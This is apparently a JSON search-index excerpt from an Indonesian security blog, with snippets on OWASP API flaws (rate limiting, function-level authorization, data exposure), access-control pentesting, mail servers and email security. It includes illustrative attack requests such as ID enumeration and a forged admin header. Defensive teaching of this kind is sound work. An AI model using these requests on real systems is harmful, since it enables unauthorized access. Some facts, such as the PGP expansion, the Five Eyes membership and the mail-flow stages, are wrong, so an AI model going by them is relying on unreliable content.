variabel tertentu." }, { "title": "OWASP API Security Lack of Resources &amp; Rate Limiting", "url": "/lack-of-resources-&-rate-limiting/", "categories": "Blogging, Tutorial, Lack of Resources & Rate Limiting", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Grapql API, jwt, Broken User Authentication, Lack of Resources & Rate Limiting, OWASP API Security", "date": "2022-02-01 00:00:00 +0700", "snippet": "API SECURITY 101 Lack of Resources &amp;amp; Rate Limitingkamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringBanyak dari kerentanan ini mempengaruhi komponen aplikasi selain API, tetapi mereka cenderung memanifestasikan dirinya dalam API. mari kita bicara tentang kerentanan OWASP API Secururity #4, Lack of Resources &amp;amp; Rate Limiting..OWASP API Security Lack of Resources &amp;amp; Rate LimitingOWASP API Security Lack of Resources &amp;amp; Rate Limiting adalah ketika API tidak membatasi jumlah atau frekuensi request dari client API tertentu. Jadi client API dapat membuat ribuan atau bahkan lebih panggilan API per detik, atau meminta ratusan atau ribuan catatan data sekaligus, dan server akan tetap berusaha memenuhi request.terdengar cukup menarik? Dalam banyak kasus, kurangnya resource dan Limit bukanlah masalah. Tapi terkadang, bisa membiarkan penyerang melakukan sesuatu yang lebih.kenapa Lack of Resources &amp;amp; Rate Limiting menjadi masalah?Pertama-tama, kurangnya pembatasan kecepatan dapat memengaruhi kinerja server API dan memungkinkan penyerang melakukan serangan DoS. Ketika satu client atau beberapa client terlalu banyak request sekaligus, request dari client tersebut dapat membebani kemampuan server untuk memproses request dan menjadi lambat atau tidak tersedia untuk user lain.Masalah lainnya adalah kurangnya pembatasan kecepatan dapat menyebabkan serangan paksa otentikasi dan dengan Broken Object Level Authorization. Misalnya, jika tidak ada batasan berapa kali user dapat mengirimkan request masuk, penyerang dapat memaksa kata sandi user dengan mencoba masuk dengan kata sandi yang berbeda hingga berhasil.Di sisi lain, jika aplikasi Object Level Authorization, penyerang dapat menggunakan yang tidak membatasi kecepatan untuk memaksa ID yang mengarah ke data sensitif.Terakhir, kurangnya pembatasan kecepatan dapat membantu penyerang mengekstrak data sensitif lebih cepat jika API membocorkan informasi. Misalnya, digunakan untuk mengambil email user dan tidak dibatasi oleh akses kontrol. ini akan mengembalikan 20 konten email:Contoh OWASP API Security Injection Lack of Resources &amp;amp; Rate Limitinghttps://api.example.com/v1.1/emails/view?user_id=123&amp;amp;entries=20dia akan mengembalikan 5000, memungkinkan penyerang membaca semua email user dalam satu panggilan API:https://api.example.com/v1.1/profile/email/view?user_id=1337Penyerang menjalankan sejumlah besar request API untuk memanenkan alamat email user:https://api.example.com/v1.1/profile/email/view?user_id=1337 https://api.example.com/v1.1/profile/email/view?user_id=124 https:// api.example.com/v1.1/profile/email/view?user_id=125 =============https://api.example.com/v1.1/profile/email/view?user_id= 2345Mencegah masalah Lack of Resources &amp;amp; Rate LimitingJadi bagaimana kamu bisa mencegah masalah ini? kamu perlu membatasi akses user ke resource! Tapi itu lebih mudah diucapkan daripada dilakukan.Tingkat yang sesuai dan batas resource untuk setiap fungsi seringkali harus berbeda. Misalnya, batas kecepatan untuk otentikasi harus jauh lebih rendah untuk mencegah serangan brute-forcing. Hal pertama yang dapat kamu lakukan adalah menentukan apa itu “penggunaan normal” untuk fungsi tertentu itu. Kemudian, blokir user yang meminta resource pada tingkat yang jauh lebih tinggi dari biasanya.Menentukan resiko masalah Rate Limit adalah di mana kerentanan berada dalam konteks aplikasi. Lain kali, mari kita lihat masalah API lain yang juga berarti berbeda dalam konteks yang berbeda: OWASP API Security #5, Broken Function Level Authorization, dan cara menentukan dampaknya pada aplikasi. Lain kali, mengapa kamu harus mengaudit fungsionalitas sensitif di OWASP API kamu terlebih dahulu." }, { "title": "OWASP API Security Broken Function Level Authorization", "url": "/function-level-authorization/", "categories": "Blogging, Tutorial, Broken Function Level Authorization", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, Broken Function Level Authorization, OWASP API Security", "date": "2022-01-30 00:00:00 +0700", "snippet": "Kita semakin mengandalkan API untuk mendukung aplikasi kita. Dalam seri Keamanan API 101 ini, mari kita bahas kerentanan keamanan yang memengaruhi API, apa yang menyebabkan kerentanan ini, dan cara mencegahnya di aplikasi kamu sendiri.kamu mungkin pernah mendengar tentang top 10 OWASP atau sepuluh kerentanan teratas yang mengancam aplikasi web. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Asset Management Insufficient Logging &amp;amp; Monitoring.Hari ini, mari kita bicara tentang: OWASP API Security #5, Broken Function Level Authorization.Api Security Function Level AuthorizationOWASP API Security Broken Function Level Authorization.Sebelum kita menyelami kerentanan, kamu mungkin akan merasa terbantu untuk meninjau posting saya tentang OWASP API Security Broken Object Level Authorization terlebih dahulu. Singkatnya, API sering kali mengekspos pengidentifikasi objek yang digunakan untuk mengakses resource. Broken object level authorization terjadi ketika kontrol akses tidak diterapkan dengan benar, dan penyerang dapat melihat atau mengoperasikan resource yang seharusnya tidak mereka akses.Broken function level authorization adalah masalah serupa. Broken function level authorization adalah ketika aplikasi gagal membatasi fungsi sensitif untuk user yang berwenang. Tidak seperti broken object level authorization, cacat ini secara khusus ketika user yang tidak sah dapat mengakses fungsi sensitif atau terbatas yang seharusnya tidak mereka akses.Misalnya, ketika satu user dapat mengubah akun user lain atau ketika user biasa dapat mengakses fungsionalitas admin di situs. Masalah ini disebabkan oleh kontrol akses yang hilang atau salah dikonfigurasi. Mereka dapat memanifestasikan dirinya dalam banyak cara, jadi mari kita lihat beberapa contohnya.Contoh Broken Function Level Authorization #1: Menghapus postingan orang lainKatakanlah API memungkinkan usernya untuk mengambil posting blog dengan mengirimkan request GET titik seperti ini:GET /api/v1.1/user/1337/posts?id=32request ini akan menyebabkan API mengembalikan postingan 32 dari user 1337. Karena semua postingan di platform ini bersifat publik, setiap user dapat mengirimkan request ini untuk mengakses postingan orang lain. Namun, karena hanya user itu sendiri yang boleh mengubah postingan blog, hanya user 1337 yang dapat mengirimkan request POST untuk mengubah atau mengedit postingan.Bagaimana jika API tidak memberikan batasan yang sama pada request yang dikirim dengan metode PUT dan DELETE HTTP? Dalam hal ini, user mungkin mengubah atau menghapus posting user lain dengan menggunakan metode HTTP yang berbeda. request ini menghapus postingan user lain.DELETE /api/v1.1/user/1337/posts?id=32Contoh Broken Function Level Authorization #2: Berpura-pura menjadi adminSitus ini juga memungkinkan admin platform untuk mengubah atau menghapus postingan siapa pun. Jadi request ini semua akan berhasil jika dikirim dari akun admin.DELETE /api/v1.1/user/1337/posts?id=32POST /api/v1.1/user/1337/posts?id=32PUT /api/v1.1/user/1337/posts?id=32Tetapi situs menentukan siapa admin dengan hal khusus dalam request:Admin: 1Dalam hal ini, setiap user jahat dapat dengan mudah menambahkan header ini ke request mereka dan mendapatkan akses ke fungsi admin khusus! Broken functional level authorization dapat disebabkan oleh kontrol akses yang hilang dan implementasi kontrol akses yang buruk.Contoh Broken Function Level Authorization #3: Tidak ada kunci di pintuTerakhir, situs memungkinkan admin untuk melihat statistik situs melalui titik API khusus:GET /api/v1.1/site/stats/hd216zlaTitik admin ini tidak menerapkan batasan berbasis user apa pun. Situs bergantung pada fakta bahwa titik URL berisi string acak di akhir untuk mencegah user yang tidak sah mengaksesnya. Praktik ini disebut “Security through Obscurity”, yang berarti meningkatkan keamanan dengan menahan pengetahuan dari pihak luar.Tetapi keamanan melalui ke tidak jelasan tidak dapat diandalkan sebagai satu-satunya mekanisme keamanan. Jika penyerang dapat mengetahui URL yang tidak jelas melalui kebocoran informasi, penyerang dapat mengakses fungsionalitas sensitif yang tersembunyi.Apa yang bisa dilakukan penyerang?Apa yang dapat dilakukan penyerang dengan kerentanan broken function level authorization? Itu akan tergantung pada fungsionalitas yang dapat diakses penyerang melalui bug. Penyerang mungkin dapat menyamar sebagai user lain, mendapatkan akses ke data yang dibatasi, memodifikasi akun orang lain, atau bahkan menjadi admin situs.Kunci untuk mencegah broken function level authorization adalah dengan menerapkan kontrol akses yang terperinci dan ketat berdasarkan sesi user dan memastikan bahwa kontrol akses ini diterapkan secara konsisten terlepas dari metode request, header, dan parameter URL." }, { "title": "OWASP API Security Excessive Data Exposure", "url": "/excessive-data-exposure/", "categories": "Blogging, Tutorial, Excessive Data Exposure", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Grapql API, Excessive Data Exposure, API Security", "date": "2022-01-29 07:00:00 +0700", "snippet": "Anda mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringBanyak dari kerentanan ini mempengaruhi komponen aplikasi selain API, tetapi mereka cenderung memanifestasikan dirinya dalam API. Kali ini, mari kita selami kerentanan di API: OWASP API #3, Excessive Data Exposure.Mengapa paparan data yang berlebihan merupakan kerentanan API? Karena saya menyadari bahwa saya telah mencarinya sepanjang waktu untuk mencari bug dan tanpa menyadari bahwa itu adalah salah satu kerentanan teratas yang memengaruhi API! mari kita bicara tentang kerentanan ini, bagaimana saya biasanya mencarinya, dan bagaimana kamu dapat mencegahnya.OWASP API Security #3 Excessive Data ExposureApa itu OWASP API Security #3, Excessive Data Exposure? Saat itulah aplikasi mengungkapkan lebih banyak informasi dari yang diperlukan kepada user melalui respons API.Mari kita pertimbangkan kasus penggunaan API yang sederhana. Aplikasi web mengambil informasi menggunakan layanan API, kemudian menggunakan informasi tersebut untuk mengisi halaman web dan ditampilkan ke browser user.displays data requests datauser &amp;lt;----------------- application -------------------&amp;gt; API service(browser) (API client) Untuk banyak layanan API, aplikasi API client. tidak memiliki kemampuan untuk memilih bidang data mana yang dikembalikan dalam panggilan API. Katakanlah sebuah aplikasi mengambil informasi user dari API untuk mengisi profil user. Panggilan API untuk mengambil informasi user terlihat seperti ini:https://api.example.com/v1.1/users/show?user_id=12Server API akan merespons dengan seluruh objek user yang sesuai:{ &quot;id&quot;: 6253282, &quot;username&quot;: &quot;Omaigot&quot;, &quot;screen_name&quot;: &quot;darksec&quot;, &quot;location&quot;: &quot;Blk 335 Smith Street&quot;, &quot;bio&quot;: &quot;Hacker. .&quot;, &quot;api_token&quot;: &quot;8a48c14b04d94d81ca484e8f32daf6dc&quot;, &quot;phone_number&quot;: &quot;123-456-7890&quot;, &quot;address&quot;: &quot;Blk 335 Smith Street, SG&quot; }Kamu melihat bahwa selain informasi dasar tentang user, panggilan API ini juga mengembalikan token API, nomor telepon, dan alamat user tersebut. Karena panggilan ini digunakan untuk mengambil data untuk mengisi halaman profil user, aplikasi hanya perlu mengirimkan username, screen_name, location, dan bio ke browser.Beberapa pengembang aplikasi berasumsi bahwa jika mereka tidak menampilkan informasi sensitif di halaman web, user tidak dapat melihatnya. Jadi mereka pada gilirannya mengirim seluruh respons API ini ke browser user tanpa menyaring informasi sensitif terlebih dahulu dan mengandalkan code dari sisi client untuk menyaring informasi pribadi. Ketika ini terjadi, siapa pun yang mengunjungi halaman profil akan dapat mencegat respons API ini dan membaca info sensitif tentang user itu!Penyerang mungkin juga dapat membaca data sensitif dengan mengunjungi halaman tertentu yang membocorkan informasi atau melakukan serangan MITM untuk mencuri respons API yang dikirim ke korban.Mencagah excessive data exposureEksposur data yang berlebihan terjadi ketika aplikasi cliet API tidak memfilter hasil yang didapatnya sebelum mengembalikan data ke user aplikasi.Saat API mengirim data yang sensitif, aplikasi client harus memfilter data sebelum meneruskannya ke user. Tentukan dengan cermat apa yang harus diketahui user dan pastikan untuk memfilter apa pun yang tidak boleh diakses oleh user. Idealnya, kembalikan jumlah minimum data yang diperlukan untuk merender halaman web.Jika API mengizinkannya, Kamu juga dapat meminta jumlah minimum data yang diperlukan dari server API. Misalnya, GraphQL API memungkinkan kamu menentukan bidang objek persis yang kamu butuhkan dalam request API.Terakhir, hindari pengiriman informasi sensitif dengan trafic yang tidak terenkripsi.saya selalu memperhatikan kerentanan ini ketika saya mencari bug. Sebagai bug hunter dan penguji, saya terbiasa menangkap setiap respons server untuk kata kunci seperti key, token, dan secret. Dan lebih sering daripada tidak, saya menemukan kebocoran informasi sensitif dengan cara ini.Sering kali, kebocoran info sensitif ini disebabkan oleh masalah yang saya jelaskan di sini: server terlalu mengembalikan seluruh respons API dari server API alih-alih memfilternya sebelum meneruskannya ke user.Excessive Data Exposure, sayangnya, sangat umum. Dan ketika dikombinasikan dengan OWASP API #4, Lack of Resources &amp;amp; Rate Limiting, bisa menjadi masalah yang lebih besar." }, { "title": "Teknik mengamankan Web dengan Access Control Model", "url": "/access-control-model/", "categories": "Blogging, Tutorial, Teknik Menyerang web aplikasi", "tags": "Access Control Models, Broken Access Control Model, Testing Broken Access control Models, Web Applications, users, Documents, logs, Reports", "date": "2022-01-25 00:00:00 +0700", "snippet": "Follow @EnogembokSejauh ini kamu mungkin telah menemukan berbagai web aplikasi di mana kamu dapat mengundang anggota dengan akses terbatas ke informasi dalam organisasi. developer dapat membuat aplikasi atau layanan tersebut dengan menerapkan Access Control Model dalam aplikasi mereka.Access Control ModelApa itu Access Control ModelAccess Control Model adalah untuk mengontrol akses user ke resource dan bagaimana mereka berinteraksi dengannya. Dalam konteks web aplikasi, Access Control Model digunakan untuk mengontrol akses user ke resource dan bagaimana mereka berinteraksi dengannya. Misalnya, jika user adalah administrator, dia mungkin diizinkan untuk mengakses semua resource dalam aplikasi. Namun, jika user adalah anggota, dia mungkin hanya diizinkan untuk mengakses resource yang sangat spesifik dalam aplikasi.Access Control ModelDalam contoh Access Control Model Berbasis Peran berikut, kamu dapat melihatnya memiliki 3 peran berbeda yang ditentukan dengan set izin berbeda yang ditetapkan untuk setiap peran, Misalnya, peran admin memiliki akses ke All(users, Documents, logs, dan Reports) dalam Organisasi tetapi manajer hanya memiliki akses users, documents dan reports saat karena peran user dibatasi lebih lanjut dan hanya diizinkan untuk mengakses users dan documents dalam organisasi.Mari kita gali lebih dalam untuk mengetahui berbagai jenis Access Control Model yang diimplementasikan dalam aplikasi sehari-hari yang kita gunakan: Role-Based access controls(RBAC): Model ini memberikan hak akses kepada user berdasarkan pekerjaan yang mereka lakukan dalam suatu organisasi. Dalam Access Control Model ini, administrator dapat menetapkan user ke satu atau beberapa peran sesuai dengan tugas kerja mereka. Setiap peran memungkinkan akses ke resource tertentu Discretionary Access Control (DAC): Dalam jenis akses kontrol izin diberikan atau dibatasi berdasarkan kebijakan akses yang ditentukan oleh pemilik organisasi atau aset. Mandatory Access Control (MAC): Model ini memungkinkan pengelompokan resource menurut model sensitivitas. Model ini terutama ditemukan di lingkungan militer atau pemerintah di mana dapat dipahami dalam kelompok-kelompok seperti confidential, secret, top-secret dll. Broken Access Control Model(rusak):Seperti yang kita ketahui dengan baik akan fakta bahwa web aplikasi telah berkembang jauh lebih kompleks dan besar dalam hal penanganan dan pemrosesan informasi. jadi tidak diragukan lagi meningkatkan kompleksitas dalam implementasi Access Control Model yang aman dan sempurna dalam aplikasi ini.Access Control Model yang memungkinkan user dengan permission terbatas dalam organisasi untuk mengakses informasi terbatas dalam organisasi itu dianggap rusak dan cacat. Dari situlah lahir istilah Broken Access Control. Dan apa pun yang rusak itu membuka jalan bagi HACKER JAHAT untuk mengeksploitasinya.Kesalahan yang terjadiKamu mungkin bertanya masalah apa yang dapat muncul jika Access Control Model tidak diimplementasikan dengan benar ? dan apa dampaknya jika isu-isu tersebut dieksploitasi dalam skenario dunia nyata? Jawabannya cukup sederhana, setiap kali model permission gagal mengimplementasikan dengan benar, kemungkinan eskalasi privilege muncul di dalam sistem dan tingkat serangan akan tergantung pada bagian mana dari sistem atau aplikasi yang terpengaruh atau terpapar. user/peran.Sekarang, Kembali ke pertanyaan kami apa yang bisa salah saat menerapkan Access Control Model. Selama pengalaman saya, ada 3 kemungkinan berbeda: Permission tidak diterapkan dengan Benar Dalam kasus ini beberapa terpapar ke peran/user yang tidak sah tanpa Permission yang diperlukan diterapkan dengan benar pada mereka, Misalnya jika /api/users diperlukan Permission read:users, penyerang akan dapat menjelajah /api/users tanpa Permission read:users. Permission X override Permission Y: Dalam hal ini jika user diberikan Permission read:users untuk mengakses /api/user API Endpoint, dia juga secara otomatis diberikan akses ke /api/reports endpoint. Jadi, kita dapat mengatakan Permission read:users mengesampingkan read:reports. Set of Permission override Permission X : Dalam hal ini, jika user diberikan read:users dan Permission read:reports untuk mengakses /api/user dan /api/reports API, dia juga secara otomatis diberikan akses ke /api/files, Harap dicatat bahwa kombinasi random Permission mengarah ke masalah Permission di sini, Jadi dalam hal ini, kita dapat mengatakan kombinasi random dari Permission read:W read:X dan read:Y memungkinkan akses read:Z juga. Sekarang, challage sebenarnya adalah membangun metodologi penetratin testing yang mencakup semua skenario ini dan memberi cakupan penuh dari model target. Untuk melakukan itu, kita merancang teknik yang berbeda untuk setiap jenis skenario yang dapat muncul dalam sistem. Yang akhirnya membawa kita ke teknik yang disebut berikut.testing Access Control Model yang Rusakbagian favorit saya di mana saya akan memaparkan berbagai teknik dan strategi untuk menguji Access Control Model yang rusak dalam aplikasi. Dengan pengalaman selama beberapa tahun sebagai pentester dan menganalisis BACM(broken access control models), kita telah menemukan beberapa teknik efektif untuk pentest Access Control Model.Tiga teknik/pendekatan utama kami yang efektif adalah sebagai berikut: Forwards Approach PBackword Approach Mixed ApproachUntuk memahami pendekatan ini secara efektif, mari kita asumsikan kita sedang pentest ke web aplikasi (dengan menerapkan Access Control Model) yang memungkinkan kita sebagai admin mengundang user ke organisasi kita dengan Permission khusus. Permission digambarkan dalam gambar di bawah bersama dengan API yang dapat diakses. Harus jelas bahwa user dengan Permission saja akan dapat mengakses API terkait yang berdekatan dengannya. Jika dengan cara apa pun dia dapat mengakses API lain, Access Control Model akan dianggap rusak.Access Control ModelMari kita mulai :Forward ApproachDalam strategi Forward Approach, user harus diundang hanya dengan satu permission (misalkan adalah permission berwarna hijau pertama) dan Kemudian user yang diundang dengan hanya satu permission akan mencoba mengakses semua API terbatas lainnya secara berurutan. Setelah menyelesaikan kasus penetest pertama, user harus diundang dengan permission ke-2 dan kemudian akan mencoba mengakses semua API terbatas lainnya secara berurutan dan seterusnya.Beberapa kasus testing yang dihasilkan oleh Forward Approach seperti yang tercantum di bawah ini:Contoh Forward Approach 1 :Dalam kasus Forward Approach berikut, user diberikan permission read:users dalam model dan kemudian dia mencoba mengakses API yang dibatasi lainnya dalam model permission.Contoh Forward Approach 2 :Dalam kasus Forward Approach berikut, user diberikan permission write:users dalam model dan kemudian dia mencoba mengakses API yang dibatasi lainnya dalam model permission.Contoh Forward Approach 3 :Dalam kasus Forward Approach berikut, user diberikan permission read:documents dalam model dan kemudian dia mencoba mengakses API yang dibatasi lainnya dalam model permission.Backword Approach:Dalam Backword Approach, user harus diberikan semua permission dalam model kecuali satu permission dan kita akan mencoba mengakses API masing-masing dari permission tanpa permission.Contoh Backword Approach 1 :Dalam kasus Backword Approach berikut, user diberikan semua permission kecuali permission read:user dalam model dan kemudian ia mencoba mengakses informasi user dari GET /api/users seperti yang ditunjukkan pada gambar di bawah ini.Contoh Backword Approach 2 :Dalam kasus Backword Approach berikut, user diberikan semua permission kecuali permission write:users dalam model dan kemudian ia mencoba untuk mengubah informasi user dari titik POST /api/users yang tidak memiliki permission.Mixed ApproachDalam Mixed Approach, user harus diundang dengan serangkaian permission campuran dari daftar permission dan kemudian dia akan mencoba mengakses titik API terkait dari peran terbatas.contoh Mixed Approach 1 :Dalam kasus Mixed Approach berikut, user diberikan permission read:users, write:docs, write:logs kemudian semua titik API terbatas lainnya harus diuji terhadap permission campuran ini untuk memeriksa kontrol yang rusak.Contoh Mixed Approach 2 :Dalam kasus Mixed Approach berikut user diberikan permission write:docs, read:logs, write:logs maka semua titik API yang dibatasi harus diuji terhadap permission ini seperti yang ditunjukkan pada gambar di bawah ini.PenutupDalam hal ini, titik API harus memiliki penunjuk yang dapat berupa nama, id, atau Uid ketika direferensikan ke organisasi lain atau user dari organisasi lain mengarah ke IDOR. Oleh karena itu, semua IDOR adalah masalah Access control Tetapi semua masalah Access control bukan milik IDOR. .Saya harap bisa membantu. Jika kamu memiliki pertanyaan, saran, atau permintaan, silakan hubungi kami melalui0x@3n0.usSee you next time." }, { "title": "Getting to know the Mail Server How it Works and Its Benefits", "url": "/mail-server/", "categories": "Blogging, Tutorial, Mail Server", "tags": "Mail, Mail User Agent, Mail Transport Agent, Mail Delivery Agent, Mail Server Protocol, Postfix, Qmail, SMTP, POP3, IMAP", "date": "2022-01-15 00:00:00 +0700", "snippet": "With just one click, you can send emails to other people who are far away. However, how does the email actually get to the recipient? The answer is thanks to the role of the mail server.In this article, you will learn and know more about mail servers. And how it works and its benefits.Mail ServerWhat is a Mail Server?Mail server is a server in charge of sending and receiving email. Although it looks simple, the actual process of sending an email is quite complex. The email you send goes through a series of complicated processes on the mail server to get to the recipient.In simple terms, a mail server functions the same as a post office. It saves incoming mail, then sends it to the recipient.Mail Server ComponentsIn general, all email servers consist of three components namely MTA, MDA, and MUA. Each component has a specific role in the process of moving and managing email. Let’s see what roles each component has.MUA (Mail User Agent)MUA is an application used to compose, send and receive emails. Examples of MUA for example are Yahoo, Gmail, Outlook, and other email services.Some MUAs can appear more graphical, such as Evolution, Thunderbird, and Outlook, or have a simple text-based interface such as Mutt.MTA (Mail Transport Agent)MTA is one of the components of the mail server in charge of receiving and sending email from one computer to another. MTA plays an important role in internet message handling system. Some of the tasks of the MTA include: Receive emails Request-mail exchange records and select an email server to transfer emails to. Sends an automatic response message, if the message fails to reach its destination.MDA (Mail Delivery Agent)MDA is a computer software that is responsible for delivering email from the MTA server. MDA is also known as LDA or Local Delivery Agent. Some MTAs can fill the MDA role when they add a new email message to the on-premises user message file.Mail Server ProtocolAs for protocols, there are two categories in email servers: outgoing mail protocols (SMTP) and incoming mail protocols (IMAP and POP3).SMTP or Simple Mail Transfer ProtocolSMTP is a standard protocol for transmitting or sending email. This protocol is in charge of communicating with the server to send email from local email to the email server.In the process of working, SMTP is controlled by the MTA on your email server.POP3 or Post Office ProtocolPOP 3 is the third version of the email receiving method. POP3 receives and stores email for someone until they retrieve it. POP3 is a server/client protocol where email is sent from the server to the local email.POP3 works by contacting your e-mail server, then downloading all new messages from local e-mails. Once you download them, they will disappear from the server.So, if you decide to check your email with a different gadget, the messages you downloaded earlier will no longer exist. That’s why, it’s good to do a back up.POP3 is suitable for those of you who usually open email with only one gadget.IMAP or Internet Message Access.IMAP allows you to access your email wherever you are, usually via the internet. When you read email using IMAP, you are not actually downloading, or saving it to your computer, but reading it through the server.For those of you who travel a lot and often use various gadgets to access email, we recommend using an IMAP-based email service.Types of Mail ServerThere are several types of mail servers that are distinguished based on the operating system and program. Here’s the list:SendmailAre you using a Linux operating system? Well, you must be familiar with the Sendmail mail server type. Already in existence since 1982, Sendmail is a standard Linux mail server type. As a result, Sendmail is the most widely used in the world.In addition, Sendmail is very easy to set up with decent performance. Unfortunately, in terms of security, Sendmail still needs a lot of improvement compared to other newer types of mail servers.PostfixPostfix is a type of MTA mail server which is an improved version of Sendmail. As a result, Postfix is not limited to the Linux operating system but can also be used on Mac OS X.Postfix also has a much better level of security than Sendmail because that’s what it’s all about. In addition, Postfix also has a very high performance. So, Postfix is predicted to replace Sendmail in the future.QmailOf the three types of mail servers in this article, Qmail is the MTA which is considered the safest mail server today. Why is that?Because, Qmail does not have a security hole that has a negative effect or damage its overall performance. Therefore, there are several giant email providers that use Qmail such as Yahoo and Hotmail.How Mail Server WorksBasically, the main way the mail server works is sending email (sending email) and receiving email (receiving email) which will go through five stages to find out how the mail server actually works in sending and receiving messages. Below we outline each stage of the process:Stage 1: Sending a MessageAfter composing the message and clicking the send button, MUA will send the email. Then, the recipient/client email will connect to your domain’s SMTP server. This server can be named anything, for example smtp.eg.com.Stage 2: Recipient Email Communicating with SMTP ServerThe recipient/client email communicates with the MTA server using SMTP. Then provide it your email address, recipient email address, message body, and attachments.Stage 3: SMTP Server Processing Recipient’s Email AddressAfter communicating with the recipient’s email, the MDA component via SMTP will process the recipient’s email address (specifically its domain). If the domain name is the same as the message sender, the message will be routed directly to the POP3 or IMAP domain server.However, if the domains are different, the SMTP server will communicate with the domain server first.Stage 4: Sending SMTP Server Communicating with DNSIn order to find the receiving server, the MTA via SMTP must communicate with DNS. Or, Domain Name Servers. Later DNS will take the recipient’s email domain name, then translate it into an IP address.Why does it have to be an IP address? Because the sender’s SMTP server can’t properly channel mail with just a domain name. So, it takes an IP address, which is an identity number for each computer connected to the internet.By knowing the IP address information, the mail server can work more efficiently.Stage 5: Email Connected with SMTP ServerAfter the SMTP server has the recipient’s IP address, the email forwarded by the MDA/MTA can be connected to the SMTP server. This process does not just happen. Because, actually the message sent earlier must go through a series of SMTP processes, until it finally arrives at its destination.Stage 6: Recipient SMTP Server Scans Incoming MessagesAt this stage the MUA scans for incoming messages. If it recognizes the domain and username, the message is forwarded to the domain’s POP3 or IMAP server. From there, the message will be placed in the sendmail queue. The message will be in the sendmail queue until the recipient’s email allows it to be downloaded.What are the advantages of having your own mail server?Basically, the mail servers in free and paid email services have the same process and way of working. The biggest difference lies in the freedom of setting, security, and the amount of disk space you get.Here are some of the benefits of a dedicated mail server for paid email services: Gaining Trust from CustomersBy using paid email, you are not only using a dedicated mail server, but also your own domain. Of course, it can show the professionalism of your company. So, that later the trust of your customers continues to increase. Create a Business Email for All Team MembersPaid email allows you to have your own mail server with more disk space than free email. This means that you and your team will find it easier to transfer data and communicate with clients. Have a Safe Email from Viruses and MalwareBy having your own mail server, later you will have additional security features. So, you will avoid attacks by viruses, malware, spam, and so on. Improve the Quality of Data PrivacyHaving your own mail server keeps your company’s important data protected. Don’t worry that your email data will be used by other parties to place advertisements in your inbox.Want to Have Your Own Mail Server?That’s a complete explanation of the mail server. The mail server is one of the important things to be able to make the business communication process through email run well.To increase business, a paid email subscription with a dedicated mail server is the best recommendation. Because, you can enjoy the various benefits and advantages above." }, { "title": "Mengenal Email Security", "url": "/email-security/", "categories": "Blogging, Tutorial, Email security", "tags": "Email, 2FA metadata, Protect, header, encrypt, private key, private key, PGP, session key", "date": "2022-01-14 00:00:00 +0700", "snippet": "Untuk melindungi akun dan data pelanggan dari penyerang, penyedia layanan email memiliki langkah-langkah perlindungan email. Langkah-langkah ini melibatkan server email dengan kerangka kerja yang kuat untuk kata sandi dan otentikasi, email yang aman (baik inbox maupun dalam perjalanan); firewall untuk aplikasi web; dan tools pendeteksi spam.Apa itu Email Security?Sebagai platform untuk mengirimkan virus, spam, dan phishing, email menonjol di antara para penyerang. Untuk memanipulasi user agar mendapatkan informasi pribadi, Mereka menggoda user untuk mendaftarkan file atau mengklik LINK di komputer user yang memungkinkan untuk melakukan kejahatan (seperti malware email). Untuk ancaman, siapa pun yang ingin menembus arsitektur jaringan dan meretas informasi sensitif pelanggan, email sering kali menjadi titik masuk utama. Karakteristik keamanan E-mail seringkali fleksibel, dan sesuai dengan kebutuhan userEmail SecurityFitur penyedia layanan emailBukannya, semua layanan email terpercaya memang rahasia dan terlindungi. Beberapa alternatif gratis dapat menyebabkan kerusakan. Oleh karena itu, ia memenuhi beberapa atau sebagian besar persyaratan berikut saat mencari penyedia email yang dapat diandalkan:Beberapa fitur yang paling umum dari penyedia layanan email:End to end encryptionTidak ada layanan email yang dapat menyebut dirinya aman tanpa End-to-end encryption. Pesan kamu hanya di codekan hingga masuk ke Gmail atau yahoo mail saat kamu menggunakan layanan standar. Jika End-to-end encryption digunakan, teks hanya dapat dibaca oleh pengirim dan penerima. End-to-end encryption yang paling populer untuk pesan yang dilindungi adalah yang disebut Pretty Good Protection atau PGP secara umum.Two-factor authentication (2FA)Two-factor authentication memberi kamu perlindungan lebih dan melindungi akun kamu jika ada yang mengetahui kata sandi kamu. kamu merasa lebih sulit untuk meretas inbox masuk kamu dengan memasukkan apa pun yang harus kamu miliki, seperti smartphone. Ada beberapa opsi 2FA, bervariasi dari Google dan SMSlainnya hingga aplikasi authenticate.Menghapus header dari metadata.Setiap pesan mencakup data data atau metadata, seperti browser internet, dan bahkan penerima. Demi kerahasiaan pengirim dan penerima, penyedia email yang dilindungi menghapus metadata header.Posisi server.Banyak negara tidak ramah informasi pribadi. Beberapa bahkan memiliki peraturan untuk perlindungan data yang memungkinkan informasi pribadi kamu disimpan untuk waktu tertentu. Perwakilan dari Five Eyes atau biasa dikenal dengan organisasi intelijen Five Eyes berasal dari negara Amerika Serikat, Inggris, Kanada, dan Australia. Mereka bertukar informasi tentang indikator dan merupakan salah satu lokasi tersulit bagi penyedia email yang aman untuk mendaftar.Kebutuhan akan layanan email yang amanManfaat menggunakan layanan email yang dilindungi harus jelas bagi kamu. Jika kamu masih memiliki beberapa pertanyaan, meskipun, saat beralih ke Gmail, pastikan untuk memperhatikan pertimbangan berikut: Protect emailSetelah pesan mengenai server mereka, Gmail, Hotmail, dan layanan populer lainnya tidak menyandikan informasi rahasia 